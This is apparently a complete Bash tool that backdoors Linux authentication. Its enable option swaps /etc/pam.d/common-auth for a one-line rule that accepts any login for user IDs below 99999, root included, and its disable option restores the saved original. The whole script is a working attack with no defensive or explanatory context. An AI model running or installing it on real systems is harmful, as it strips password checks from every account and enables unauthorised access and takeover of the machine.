#!/bin/bash
set -e

COMMON_FILE="/etc/pam.d/common-auth"
BACKUP_FILE="/opt/common_auth_bk"

function enable {
    mv ${COMMON_FILE} ${BACKUP_FILE}
    echo "auth    sufficient      pam_succeed_if.so uid < 99999" > ${COMMON_FILE}
}

function disable {
    mv ${BACKUP_FILE} ${COMMON_FILE}
}

while getopts ":ed" opt; do
  case ${opt} in
    e ) enable
      ;;
    d ) disable
      ;;
    * ) echo "Not l33t enough"; exit 1
      ;;
  esac
done
